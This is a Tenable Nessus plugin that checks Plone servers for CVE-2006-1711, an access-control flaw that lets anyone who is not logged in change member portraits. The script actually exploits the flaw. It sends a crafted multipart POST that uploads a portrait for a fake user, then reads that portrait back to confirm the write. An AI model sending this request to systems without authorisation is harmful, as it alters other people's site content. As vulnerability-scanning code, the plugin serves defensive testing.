#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(21219);
  script_version("$Revision: 1.11 $");

  script_cve_id("CVE-2006-1711");
  script_bugtraq_id(17484);
  script_xref(name:"OSVDB", value:"24582");

  script_name(english:"Plone Unprotected MembershipTool Methods Arbitrary Portrait Manipulation");
  script_summary(english:"Tries to change profiles using Plone");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a Python application that is affected
by an access control failure." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Plone, an open-source content manage system
written in Python. 

The version of Plone installed on the remote host does not limit
access to the 'changeMemberPortrait' and 'deletePersonalPortrait'
MembershipTool methods.  An unauthenticated attacker can leverage this
issue to delete member portraits or add / update portraits with
malicious content." );
 script_set_attribute(attribute:"see_also", value:"http://dev.plone.org/plone/ticket/5432" );
 script_set_attribute(attribute:"solution", value:
"Either install Hotfix 2006-04-10 1.0 or upgrade to Plone version 2.0.6
/ 2.1.3 / 2.5-beta2 when they become available." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:P/A:N" );
 script_end_attributes();


  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 8080);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:8080);

# Make sure Plone is installed and the affected script exists.
if (report_paranoia < 2)
{
  banner = get_http_banner(port:port);
  if (!banner || !egrep(pattern:"Server:.* Plone/", string:banner)) exit(0);
}

url = "/portal_membership/changeMemberPortrait";
r = http_send_recv3(method:"GET", item:url, port:port);
if (isnull(r)) exit(0);
res = r[2];


# If so...
if (
  '<meta name="generator" content="Plone' >< res &&
  "The parameter, <em>portrait</em>, was omitted from the request" >< res
)
{
  # Upload a profile for a nonexistent user.
  user = string(SCRIPT_NAME, "-", unixtime());
  portrait = rand_str();

  bound = "nessus";
  boundary = string("--", bound);
  postdata = string(
    boundary, "\r\n", 
   'Content-Disposition: form-data; name="portrait"; filename="', user, '.gif"', "\r\n",
    "Content-Type: image/gif\r\n",
    "\r\n",
    portrait, "\r\n",

    boundary, "\r\n", 
    'Content-Disposition: form-data; name="member_id"', "\r\n",
    "\r\n",
    user, "\r\n",

    boundary, "--", "\r\n"
  );
  r = http_send_recv3(method:"POST ", item: url,version: 11, port: port,
    add_headers: make_array("Content-Type", "multipart/form-data; boundary="+bound),
    data: postdata);
  if (isnull(r)) exit(0);

  # Retrieve the newly-created portrait.
  r = http_send_recv3(method:"GET", item:string("/portal_memberdata/portraits/", user), port:port);
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if we get our portrait content back.
  if (portrait == res) security_warning(port);
}
